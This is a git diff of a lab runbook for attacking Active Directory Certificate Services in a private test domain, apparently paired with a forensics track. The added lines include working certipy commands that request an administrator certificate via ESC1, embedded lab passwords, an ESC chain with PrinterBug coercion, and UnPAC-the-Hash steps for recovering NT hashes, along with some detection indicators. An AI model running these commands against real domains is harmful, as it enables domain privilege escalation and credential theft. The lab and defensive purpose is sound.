@@ -1,10 +1,10 @@
-# CAMPAIGNS v2 — Branch B — ADCS (Certificate Services)
+# CAMPAIGNS v3 — Branch B — ADCS (Certificate Services)
 
-> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
-> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
+> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
+> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
 > **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
 >
-> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
+> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
 
 **Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.
 
@@ -44,10 +44,35 @@ AD CS is deployed on dc01 with **12 in-scope ESC misconfigurations**. Each explo
 **Common command pattern (ESC1):**
 
 ```bash
-certipy-ad req -ca cadre-CA -template ESC1-Template -upn administrator@cadre.local \
-  -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -dc-ip 192.168.77.10
-certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.77.10 -domain cadre.local
+# Live template names are CADRE-ESC* (see adcs-configuration-guide.md)
+certipy req -u analyst_cloud@cadre.local -p 'Cl0ud_An@lyst!' -ca cadre-CA \
+  -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local -dc-ip 192.168.77.10
+certipy auth -pfx administrator.pfx -dc-ip 192.168.77.10 -domain cadre.local
 ```
+
+**Full ESC chain (Plan 1.1 — run as Branch B graph, not forever deferred):**
+
+1. `certipy find -vulnerable` (or ADeleg visual) → pick ESC  
+2. ESC1/2/3/4/6/7/9/10/11/13/14 as applicable from table above  
+3. ESC8 after coercion (Phase 5 PrinterBug / coerce_plus)  
+4. Auth with PFX → DA/EA path → converge Phase 7  
+
+#### UnPAC-the-Hash (Branch B — after ESC cert) ⏳
+
+**Source:** SpecterOps U2U / UnPAC-the-Hash. **Status:** first-class Branch B step for Plan 1.1 (not suggestions-only).
+
+After obtaining a usable cert (ESC1/ESC8/etc.), request a TGT via PKINIT then abuse User-to-User to recover the account’s NT hash without offline cracking:
+
+```bash
+# After certipy auth / PKINIT TGT in ccache
+# Tooling: certipy / impacket / Whisker-class U2U — verify live against Server 2025
+certipy auth -pfx user.pfx -dc-ip 192.168.77.10 -domain cadre.local
+# Then U2U / UnPAC path per unpac-the-hash writeup → NT hash into CredentialLedger
+```
+
+**Why in campaign:** bridges Branch B cert → pass-the-hash / further Kerberos without hashcat. Seed ledger may still hold lab cleartext; UnPAC is for telemetry + realistic post-cert tradecraft.
+
+**Detection:** Kerberos PKINIT + unusual U2U; WinSec 4768/4769 anomalies; Certipy LDAP noise.
 
 ---
 
